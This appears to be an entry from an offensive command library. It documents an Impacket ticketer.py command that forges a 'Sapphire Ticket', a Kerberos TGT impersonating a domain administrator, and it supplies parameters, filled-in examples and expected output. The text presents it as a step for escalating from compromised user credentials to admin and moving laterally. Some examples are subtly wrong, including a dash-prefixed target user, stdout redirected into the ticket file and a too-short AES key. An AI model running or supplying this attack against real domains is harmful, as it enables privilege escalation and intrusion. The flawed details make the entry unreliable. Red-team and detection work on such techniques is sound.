---
id: b3d13fa4-64a0-4e0e-a583-0b50a87224b8
name: ticketer-py-request-sapphire-ticket
type: command
executor: bash
data: >-
  ticketer.py -request -impersonate $_DOMAIN_ADMIN -domain $_DOMAIN -user
  $_DOMAIN_USER -password $_PASSWORD -aesKey $_AES_KEY -domain-sid $_DOMAIN_SID
  $_TARGET_USER
output: null
created_at: '2023-04-06T03:56:04.905427+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - kerberos
  - impersonation
verified: true
validated: true
---

# ticketer-py-request-sapphire-ticket

## Command

```bash
ticketer.py -request -impersonate $_DOMAIN_ADMIN -domain $_DOMAIN -user $_DOMAIN_USER -password $_PASSWORD -aesKey $_AES_KEY -domain-sid $_DOMAIN_SID $_TARGET_USER
```

## Description

This command uses the Impacket ticketer.py script to generate a Sapphire Ticket, a forged Kerberos TGT that impersonates a domain admin by replicating a legitimate PAC. It authenticates using compromised domain user credentials and outputs a .ccache file for subsequent use in Pass-the-Ticket attacks. Use this when you have domain user access and need to escalate to admin privileges for lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -request | Flag to request a new ticket generation | Yes |
| -impersonate $_DOMAIN_ADMIN | Username of the domain admin to impersonate (e.g., administrator) | Yes |
| -domain $_DOMAIN | Fully qualified domain name (e.g., lab.local) | Yes |
| -user $_DOMAIN_USER | Compromised domain username for authentication | Yes |
| -password $_PASSWORD | Password for the domain user | Yes |
| -aesKey $_AES_KEY | AES key for krbtgt or service encryption (hex string, e.g., from DCSync) | Yes |
| -domain-sid $_DOMAIN_SID | Domain Security Identifier (e.g., S-1-5-21-...) | Yes |
| $_TARGET_USER | Placeholder user (ignored in PAC, e.g., baduser) | Yes |

## Examples

### Basic Usage

```bash
ticketer.py -request -impersonate administrator -domain lab.local -user domain_user -password P@ssw0rd -aesKey 1234567890abcdef -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -baduser
```

### Advanced Usage

Run with additional logging by piping to a file:
```bash
ticketer.py -request -impersonate administrator -domain lab.local -user domain_user -password P@ssw0rd -aesKey 1234567890abcdef -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -baduser > sapphire_ticket.ccache 2>&1
```

## Expected Output

The command generates a Kerberos ticket file (e.g., ticket.ccache) without errors. Sample output:
```
ServicePrincipalName:  
Kerberos file saved to: /tmp/ticket.ccache
```
Verify with `klist /path/to/ticket.ccache` to see the impersonated principal (e.g., administrator@lab.local) and validity period.

## Related

- [[procedures/Pass-the-Ticket-Using-Sapphire-Tickets]]
- [[tools/Impacket-Ticketer]]
